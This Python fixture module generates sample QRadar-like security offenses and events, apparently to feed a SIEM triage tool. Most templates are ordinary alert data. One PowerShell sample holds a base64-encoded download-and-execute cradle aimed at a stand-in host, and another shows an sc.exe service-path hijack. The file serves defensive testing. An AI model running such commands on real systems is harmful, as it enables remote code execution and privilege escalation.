"""Sample QRadar-like offenses & events used when QRadar is not configured."""
from datetime import datetime, timezone, timedelta
import random
import uuid


def _now_iso(offset_min: int = 0) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=offset_min)).isoformat()


SAMPLE_OFFENSE_TEMPLATES = [
    {
        "description": "DLB-UC-00197-Permit Connections RBI_IOC_IP Feeds Inbound",
        "severity": 8, "magnitude": 8, "credibility": 8, "relevance": 8,
        "categories": ["Threat Intel", "Firewall"],
        "offense_type": "Source IP",
        "rules": ["DLB-UC-00197-Permit Connections RBI_IOC_IP Feeds Inbound"],
        "source_ips": ["45.79.181.223"],
        "destination_ips": ["159.60.134.37"],
        "usernames": [],
        "network": "Corp-DMZ",
        "sample_events": [
            {"event_name": "Permit Connection - Inbound RBI IOC Match", "sourceip": "45.79.181.223",
             "destinationip": "159.60.134.37", "log_source": "F5XC WAAP", "log_source_ip": "10.5.10.60",
             "category": "Firewall Permit", "low_level_category": "Firewall Permit",
             "protocol": "TCP", "port": 80,
             "payload": ("Event: Permit  Source IP: 45.79.181.223  Destination IP: 159.60.134.37  "
                         "Destination Port: 80  Method: GET  Request Path: /  Response Code: 404  "
                         "ASN: akamai connected cloud (63949)  City: Cedar Knolls  "
                         "User Agent: Mozilla/5.0 (Macintosh) Chrome/108.0.0.0  Log Source: F5XC")},
        ],
    },
    {
        "description": "DLB-UC-00262-Execution of DDL/DML/DCL/DQL/TCL commands in DAM",
        "severity": 6, "magnitude": 6, "credibility": 7, "relevance": 6,
        "categories": ["Database", "Data Manipulation"],
        "offense_type": "Username",
        "rules": ["DLB-UC-00262-Execution of DDL/DML/DCL/DQL/TCL commands in DAM"],
        "source_ips": ["172.17.53.33"],
        "destination_ips": ["172.17.53.55"],
        "usernames": ["1525"],
        "network": "Corp-DB",
        "sample_events": [
            {"event_name": "SQL Command Execution", "sourceip": "172.17.53.33",
             "destinationip": "172.17.53.55", "username": "1525",
             "log_source": "PRD-DC-APP3DAMCOLLECTOR", "log_source_ip": "172.17.53.22",
             "category": "Database Activity", "low_level_category": "Database Activity",
             "process": "SQLNAVIGATOR.EXE",
             "payload": ("Source IP: 172.17.53.33  Destination IP: 172.17.53.55  DB_Username: 1525  "
                         "ProgramName: C:\\PROGRAM FILES\\QUEST SOFTWARE\\SQL NAVIGATOR 2019\\SQLNAVIGATOR.EXE  "
                         "SQL Command: truncate table orcl211.temp_acct6  "
                         "Log Source: PRD-DC-APP3DAMCOLLECTOR@172.17.53.22")},
        ],
    },
    {
        "description": "DLB-UC-00256-VPN login failures/success for multiple users from same IP",
        "severity": 7, "magnitude": 7, "credibility": 7, "relevance": 7,
        "categories": ["VPN", "Authentication"],
        "offense_type": "Source IP",
        "rules": ["DLB-UC-00256-VPN login failures/success for multiple users from same IP"],
        "source_ips": ["203.192.244.18"],
        "destination_ips": ["172.17.10.5"],
        "usernames": ["a.deshmukh", "n.rathore", "j.thomas"],
        "network": "Corp-VPN",
        "sample_events": [
            {"event_name": "VPN Login Failure", "sourceip": "203.192.244.18",
             "destinationip": "172.17.10.5", "username": "a.deshmukh",
             "log_source": "Instasafe VPN", "log_source_ip": "172.17.10.5",
             "category": "VPN Authentication", "low_level_category": "User Login Failure",
             "payload": "VPN Login FAILED user=a.deshmukh src=203.192.244.18 reason='Invalid credentials'"},
            {"event_name": "VPN Login Failure", "sourceip": "203.192.244.18",
             "destinationip": "172.17.10.5", "username": "n.rathore",
             "log_source": "Instasafe VPN", "log_source_ip": "172.17.10.5",
             "category": "VPN Authentication", "low_level_category": "User Login Failure",
             "payload": "VPN Login FAILED user=n.rathore src=203.192.244.18 reason='Invalid credentials'"},
            {"event_name": "VPN Login Success", "sourceip": "203.192.244.18",
             "destinationip": "172.17.10.5", "username": "j.thomas",
             "log_source": "Instasafe VPN", "log_source_ip": "172.17.10.5",
             "category": "VPN Authentication", "low_level_category": "User Login Success",
             "payload": "VPN Login SUCCESS user=j.thomas src=203.192.244.18"},
        ],
    },
    {
        "description": "Browsed to Phishing Website",
        "severity": 7, "magnitude": 7, "credibility": 8, "relevance": 7,
        "categories": ["Web", "Phishing"],
        "offense_type": "Username",
        "rules": ["Browsed to Phishing Website"],
        "source_ips": ["10.30.4.77"],
        "destination_ips": ["185.220.101.55"],
        "usernames": ["p.sharma"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "URL Filter Alert - Phishing", "sourceip": "10.30.4.77",
             "destinationip": "185.220.101.55", "username": "p.sharma",
             "log_source": "Palo Alto URL Filter", "log_source_ip": "10.5.10.45",
             "category": "Web Filter", "low_level_category": "Phishing Site Access",
             "url": "https://securelog1n-office365.top/reset",
             "payload": ("URL Filter Category: phishing  User: p.sharma  Source IP: 10.30.4.77  "
                         "URL: https://securelog1n-office365.top/reset  Verdict: phishing  Action: allowed")},
        ],
    },
    {
        "description": "Multiple Login Failures for Single Username",
        "severity": 6, "magnitude": 6, "credibility": 7, "relevance": 6,
        "categories": ["Authentication", "Brute Force"],
        "offense_type": "Username",
        "rules": ["Multiple Login Failures for Single Username"],
        "source_ips": ["10.11.4.14"],
        "destination_ips": ["172.17.51.7"],
        "usernames": ["4421"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "An account failed to log on", "sourceip": "10.11.4.14",
             "destinationip": "172.17.51.7", "username": "4421",
             "log_source": "PRD-DC-PDCAD", "log_source_ip": "172.17.51.7",
             "category": "Authentication", "low_level_category": "User Login Failure",
             "windows_event_id": "4625",
             "payload": "An account failed to log on. Account Name: 4421  Logon Type: 3  Failure Reason: Unknown user name or bad password  Status: 0xC000006D"},
        ],
    },
    {
        "description": "DLB - Sensitive File Upload to Personal Cloud Storage",
        "severity": 8, "magnitude": 7, "credibility": 7, "relevance": 8,
        "categories": ["Data Loss", "Cloud Upload"],
        "offense_type": "Username",
        "rules": ["DLB - Personal Cloud Upload (Confidential)"],
        "source_ips": ["10.14.22.55"],
        "destination_ips": ["142.250.72.174"],
        "usernames": ["r.patel"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "File Upload to External Service", "sourceip": "10.14.22.55",
             "destinationip": "142.250.72.174", "username": "r.patel",
             "log_source": "Symantec DLP", "log_source_ip": "10.5.10.11",
             "category": "Data Loss Prevention", "low_level_category": "Data Loss Prevention",
             "url": "https://drive.google.com/upload/file", "protocol": "HTTPS",
             "machine_identifier": "USR-LTP-2214",
             "payload": ("DLP Incident id=88221  Policy: Confidential-Docs  Severity: High  "
                          "User: r.patel  Endpoint: USR-LTP-2214  Source IP: 10.14.22.55  "
                          "Destination: drive.google.com  URL: https://drive.google.com/upload/file  "
                          "File: Customer_Contracts_Q4.pdf  Size: 4.2MB  Match count: 12  Action: BLOCKED")},
        ],
    },
    {
        "description": "DLB - Bulk Email with Attachments to External Domain",
        "severity": 7, "magnitude": 7, "credibility": 6, "relevance": 7,
        "categories": ["Data Loss", "Email"],
        "offense_type": "Username",
        "rules": ["DLB - Outbound Mail w/ Attachment Volume"],
        "source_ips": ["10.16.4.88"],
        "destination_ips": ["159.89.128.10"],
        "usernames": ["s.olsen"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "Outbound Email With Attachment", "sourceip": "10.16.4.88",
             "destinationip": "159.89.128.10", "username": "s.olsen",
             "log_source": "Proofpoint Enterprise", "log_source_ip": "10.5.10.30",
             "category": "Email", "low_level_category": "Data Loss Prevention",
             "machine_identifier": "USR-DKT-4491", "protocol": "SMTP",
             "payload": ("Message-ID=<abc123@corp>  From: s.olsen@corp.example  To: freelance-outbox@personalmail.io  "
                          "Subject: Q3 client roster - final  Attachments: 3 (12.4MB total, .xlsx, .xlsx, .pdf)  "
                          "DLP Rule: Bulk-Outbound-Confidential  Match count: 47  Action: QUARANTINED")},
        ],
    },
    {
        "description": "DLB - USB Mass Storage Write of Restricted Files",
        "severity": 6, "magnitude": 6, "credibility": 7, "relevance": 6,
        "categories": ["Data Loss", "Removable Media"],
        "offense_type": "Username",
        "rules": ["DLB - USB Write - Restricted Repository"],
        "source_ips": ["10.20.11.42"],
        "destination_ips": ["10.20.11.42"],
        "usernames": ["k.mwangi"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "File Copy to Removable Device", "sourceip": "10.20.11.42",
             "destinationip": "10.20.11.42", "username": "k.mwangi",
             "log_source": "CrowdStrike EDR", "log_source_ip": "10.5.10.55",
             "category": "Removable Media", "low_level_category": "Data Loss Prevention",
             "machine_identifier": "USR-LTP-8823", "process": "explorer.exe",
             "payload": ("DeviceEvent: USBWrite  User: k.mwangi  Host: USR-LTP-8823  "
                          "Device: SanDisk Cruzer Blade (VID_0781 PID_5567 Serial:4C530001250620104130)  "
                          "Files: 14 (Design_Specs_v9.docx, Roadmap_2027.pptx, ...)  Total: 88MB  "
                          "Repository: \\\\fs-eng\\Restricted  Action: LOGGED")},
        ],
    },
    {
        "description": "Login Failure to Expired Account",
        "severity": 5, "magnitude": 5, "credibility": 7, "relevance": 5,
        "categories": ["Authentication", "User Login Failure"],
        "offense_type": "Username",
        "rules": ["AD - Login Failure to Expired Account"],
        "source_ips": ["172.17.51.168"],
        "destination_ips": ["172.17.51.7"],
        "usernames": ["6936"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "An account failed to log on: Expired Password",
             "sourceip": "172.17.51.168", "destinationip": "172.17.51.7",
             "username": "6936", "log_source": "PRD-DC-PDCAD",
             "log_source_ip": "172.17.51.7", "category": "User Login Failure",
             "low_level_category": "User Login Failure",
             "windows_event_id": "4625", "error_code": "0xC0000224",
             "failure_reason": "The specified account's password has expired",
             "machine_identifier": "PRDN-SSOAPP1",
             "payload": ("An account failed to log on. Subject: Security ID: NULL SID  "
                          "Account Name: 6936  Account Domain: -  Logon ID: 0x0  "
                          "Logon Type: 3  Failure Information: Failure Reason: The specified account's password has expired.  "
                          "Status: 0xC0000224  Sub Status: 0xC0000224  Workstation Name: PRDN-SSOAPP1  "
                          "Source Network Address: 172.17.51.168  Source Port: 51920  Event ID: 4625")},
            {"event_name": "An account failed to log on: Expired Password",
             "sourceip": "172.17.51.168", "destinationip": "172.17.51.7",
             "username": "6936", "log_source": "PRD-DC-PDCAD",
             "log_source_ip": "172.17.51.7", "category": "User Login Failure",
             "low_level_category": "User Login Failure",
             "windows_event_id": "4625", "error_code": "0xC0000224",
             "failure_reason": "The specified account's password has expired",
             "machine_identifier": "PRDN-SSOAPP1",
             "payload": ("An account failed to log on. Account Name: 6936  Logon Type: 3  "
                          "Failure Reason: The specified account's password has expired.  Status: 0xC0000224  "
                          "Workstation: PRDN-SSOAPP1  Source Network Address: 172.17.51.168  Event ID: 4625")},
            {"event_name": "An account was successfully logged on",
             "sourceip": "172.17.51.168", "destinationip": "172.17.51.7",
             "username": "6936", "log_source": "PRD-DC-PDCAD",
             "log_source_ip": "172.17.51.7", "category": "User Login Success",
             "low_level_category": "User Login Success",
             "windows_event_id": "4624", "machine_identifier": "PRDN-SSOAPP1",
             "payload": ("An account was successfully logged on. Account Name: 6936  Logon Type: 3  "
                          "Workstation: PRDN-SSOAPP1  Source Network Address: 172.17.51.168  Event ID: 4624")},
        ],
    },
    {
        "description": "Multiple Failed SSH Login Attempts followed by Successful Login",
        "severity": 8, "magnitude": 7, "credibility": 8, "relevance": 7,
        "categories": ["Authentication", "Brute Force"],
        "offense_type": "Source IP",
        "rules": ["SSH Brute Force Rule", "Post-Auth Anomaly"],
        "source_ips": ["185.220.101.42"],
        "destination_ips": ["10.0.14.22"],
        "usernames": ["svc_backup"],
        "network": "Corp-DMZ",
        "sample_events": [
            {"event_name": "SSH Failed Login", "sourceip": "185.220.101.42", "destinationip": "10.0.14.22",
             "username": "root", "log_source": "Linux-Auth", "category": "Authentication",
             "payload": "sshd[2841]: Failed password for root from 185.220.101.42 port 51920 ssh2"},
            {"event_name": "SSH Failed Login", "sourceip": "185.220.101.42", "destinationip": "10.0.14.22",
             "username": "admin", "log_source": "Linux-Auth", "category": "Authentication",
             "payload": "sshd[2841]: Failed password for admin from 185.220.101.42 port 51921 ssh2"},
            {"event_name": "SSH Successful Login", "sourceip": "185.220.101.42", "destinationip": "10.0.14.22",
             "username": "svc_backup", "log_source": "Linux-Auth", "category": "Authentication",
             "payload": "sshd[2843]: Accepted password for svc_backup from 185.220.101.42 port 51930 ssh2"},
        ],
    },
    {
        "description": "Suspicious PowerShell Encoded Command Execution",
        "severity": 9, "magnitude": 9, "credibility": 7, "relevance": 9,
        "categories": ["Process Creation", "Suspicious Activity"],
        "offense_type": "Username",
        "rules": ["Encoded PowerShell Detection", "LOLBin Abuse"],
        "source_ips": ["10.10.34.12"],
        "destination_ips": ["10.10.34.12"],
        "usernames": ["j.miller"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "Process Creation", "sourceip": "10.10.34.12", "username": "j.miller",
             "log_source": "Sysmon", "category": "Process Creation",
             "payload": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBiAGEAZAAuAGMAbwBtAC8AcwAiACkA",
             "parent_process": "outlook.exe", "process": "powershell.exe",
             "command_line": "powershell -nop -w hidden -enc SQBFAFgAKABOAGUA..."},
            {"event_name": "Network Connection", "sourceip": "10.10.34.12", "destinationip": "45.155.204.199",
             "username": "j.miller", "log_source": "Sysmon", "category": "Network",
             "payload": "connection to 45.155.204.199:443 by powershell.exe"},
        ],
    },
    {
        "description": "Firewall - Repeated Denies from External IP to Internal Database Port",
        "severity": 6, "magnitude": 6, "credibility": 6, "relevance": 5,
        "categories": ["Firewall", "Recon"],
        "offense_type": "Source IP",
        "rules": ["External Recon Rule"],
        "source_ips": ["141.98.10.55"],
        "destination_ips": ["10.0.5.10", "10.0.5.11", "10.0.5.12"],
        "usernames": [],
        "network": "Corp-DB",
        "sample_events": [
            {"event_name": "Firewall Deny", "sourceip": "141.98.10.55", "destinationip": "10.0.5.10",
             "log_source": "Palo Alto FW", "category": "Firewall", "port": 3306, "protocol": "TCP",
             "payload": "DENY tcp 141.98.10.55:44120 -> 10.0.5.10:3306"},
            {"event_name": "Firewall Deny", "sourceip": "141.98.10.55", "destinationip": "10.0.5.11",
             "log_source": "Palo Alto FW", "category": "Firewall", "port": 5432, "protocol": "TCP",
             "payload": "DENY tcp 141.98.10.55:44121 -> 10.0.5.11:5432"},
        ],
    },
    {
        "description": "DNS Tunneling Detected - Excessive TXT Queries to Rare Domain",
        "severity": 8, "magnitude": 8, "credibility": 7, "relevance": 8,
        "categories": ["DNS", "Command and Control"],
        "offense_type": "Source IP",
        "rules": ["DNS Tunneling Rule"],
        "source_ips": ["10.20.5.88"],
        "destination_ips": ["8.8.8.8"],
        "usernames": ["a.chen"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "DNS Query", "sourceip": "10.20.5.88", "log_source": "Windows DNS",
             "category": "DNS", "url": "aabbcc112233.evil-c2.io",
             "payload": "DNS TXT query for aabbcc112233.evil-c2.io from 10.20.5.88"},
            {"event_name": "DNS Query", "sourceip": "10.20.5.88", "log_source": "Windows DNS",
             "category": "DNS", "url": "ddee44.evil-c2.io",
             "payload": "DNS TXT query for ddee44.evil-c2.io from 10.20.5.88"},
        ],
    },
    {
        "description": "Malware Detected - Ransomware Signature on File Server",
        "severity": 10, "magnitude": 10, "credibility": 10, "relevance": 10,
        "categories": ["Malware", "Ransomware"],
        "offense_type": "Destination IP",
        "rules": ["EDR Ransomware Signature", "File Encryption Behavior"],
        "source_ips": ["10.5.5.100"],
        "destination_ips": ["10.5.5.100"],
        "usernames": ["SYSTEM"],
        "network": "Corp-FileServers",
        "sample_events": [
            {"event_name": "Malware Detection", "sourceip": "10.5.5.100", "username": "SYSTEM",
             "log_source": "CrowdStrike EDR", "category": "Malware", "file_hash": "3b6a4c9e2f1d5b8a7e6f4c3d2b1a0987",
             "payload": "CONVICTION ransomware.LockBit hash=3b6a4c9e2f1d5b8a7e6f4c3d2b1a0987 file=C:\\\\Users\\\\Public\\\\svchost.exe"},
            {"event_name": "File Modification Burst", "sourceip": "10.5.5.100", "username": "SYSTEM",
             "log_source": "CrowdStrike EDR", "category": "File Activity",
             "payload": "5000+ files renamed with .lockbit extension in 60s"},
        ],
    },
    {
        "description": "Impossible Travel - User Login From Two Countries in Short Window",
        "severity": 7, "magnitude": 7, "credibility": 8, "relevance": 7,
        "categories": ["Authentication", "Account Compromise"],
        "offense_type": "Username",
        "rules": ["Impossible Travel Rule"],
        "source_ips": ["203.0.113.45", "192.0.2.108"],
        "destination_ips": ["login.microsoftonline.com"],
        "usernames": ["m.rodriguez"],
        "network": "Cloud-Auth",
        "sample_events": [
            {"event_name": "Cloud Sign-In", "sourceip": "203.0.113.45", "username": "m.rodriguez",
             "log_source": "Azure AD", "category": "Authentication",
             "payload": "Sign-in from 203.0.113.45 (Country: US) at 10:14 UTC"},
            {"event_name": "Cloud Sign-In", "sourceip": "192.0.2.108", "username": "m.rodriguez",
             "log_source": "Azure AD", "category": "Authentication",
             "payload": "Sign-in from 192.0.2.108 (Country: RU) at 10:31 UTC"},
        ],
    },
    {
        "description": "Data Exfiltration - Large Outbound Transfer to Uncategorized Site",
        "severity": 8, "magnitude": 8, "credibility": 7, "relevance": 8,
        "categories": ["Data Exfiltration", "Network"],
        "offense_type": "Source IP",
        "rules": ["Exfil Volume Rule"],
        "source_ips": ["10.10.20.55"],
        "destination_ips": ["45.83.65.201"],
        "usernames": ["k.watanabe"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "Large Outbound Transfer", "sourceip": "10.10.20.55", "destinationip": "45.83.65.201",
             "log_source": "NetFlow", "category": "Network", "protocol": "TCP", "port": 443,
             "payload": "2.3 GB transferred over 12 minutes to 45.83.65.201:443"},
        ],
    },
    {
        "description": "Privilege Escalation Attempt via Windows Service Modification",
        "severity": 7, "magnitude": 7, "credibility": 7, "relevance": 8,
        "categories": ["Privilege Escalation"],
        "offense_type": "Username",
        "rules": ["Service Registry Modification Rule"],
        "source_ips": ["10.15.7.44"],
        "destination_ips": ["10.15.7.44"],
        "usernames": ["temp_user_02"],
        "network": "Corp-Users",
        "sample_events": [
            {"event_name": "Registry Modification", "sourceip": "10.15.7.44", "username": "temp_user_02",
             "log_source": "Sysmon", "category": "Registry", "registry": "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\...",
             "payload": "sc.exe config Spooler binPath= 'cmd.exe /c powershell -enc ...'"},
        ],
    },
]


def _severity_label(sev: int) -> str:
    if sev >= 9:
        return "Critical"
    if sev >= 7:
        return "High"
    if sev >= 4:
        return "Medium"
    return "Low"


def generate_sample_offenses(client_id: str, count: int = 8) -> list[dict]:
    """Return a list of offense dicts using templates."""
    offenses = []
    for i in range(count):
        tpl = SAMPLE_OFFENSE_TEMPLATES[i % len(SAMPLE_OFFENSE_TEMPLATES)]
        oid = int(1000 + i)
        events = []
        # Replicate template events with slight variations so every offense has 5-8 events
        base_events = tpl.get("sample_events", [])
        replicas_needed = max(0, 6 - len(base_events))
        for e in base_events:
            ev = dict(e)
            ev["event_time"] = _now_iso(random.randint(1, 240))
            ev["event_uuid"] = str(uuid.uuid4())  # don't clobber windows_event_id
            events.append(ev)
        # Add variant events for realism
        for j in range(replicas_needed):
            src = base_events[j % len(base_events)] if base_events else {}
            ev = dict(src)
            ev["event_time"] = _now_iso(random.randint(1, 240))
            ev["event_uuid"] = str(uuid.uuid4())
            # Vary the port / source-ip / username slightly for a realistic feed
            if ev.get("sourceip") and tpl.get("source_ips"):
                ev["sourceip"] = tpl["source_ips"][j % len(tpl["source_ips"])]
            if ev.get("username") and tpl.get("usernames"):
                ev["username"] = tpl["usernames"][j % len(tpl["usernames"])]
            if ev.get("port"):
                ev["port"] = int(ev["port"]) + j
            events.append(ev)
        random.shuffle(events)
        off = {
            "id": str(uuid.uuid4()),
            "qradar_offense_id": oid,
            "client_id": client_id,
            "description": tpl["description"],
            "magnitude": tpl["magnitude"],
            "credibility": tpl["credibility"],
            "severity": tpl["severity"],
            "relevance": tpl["relevance"],
            "severity_label": _severity_label(tpl["severity"]),
            "status": "OPEN",
            "assigned_user": None,
            "start_time": _now_iso(random.randint(60, 600)),
            "last_updated": _now_iso(random.randint(1, 60)),
            "categories": tpl["categories"],
            "source_count": len(tpl["source_ips"]),
            "destination_count": len(tpl["destination_ips"]),
            "username_count": len(tpl["usernames"]),
            "event_count": len(events) + random.randint(2, 30),
            "flow_count": random.randint(10, 200),
            "network": tpl["network"],
            "domain_id": None,
            "closing_reason": None,
            "offense_type": tpl["offense_type"],
            "rules": tpl["rules"],
            "source_ips": tpl["source_ips"],
            "destination_ips": tpl["destination_ips"],
            "usernames": tpl["usernames"],
            "events": events,
            "ai_analysis": None,
            "risk_score": 0,
            "mitre_techniques": [],
            "iocs": {},
            "recommendation": None,
            "confidence": 0,
            "similar_incidents": [],
            "kb_matches": [],
            "merged_into": None,
            "merged_from": [],
            "created_at": _now_iso(0),
        }
        offenses.append(off)
    return offenses
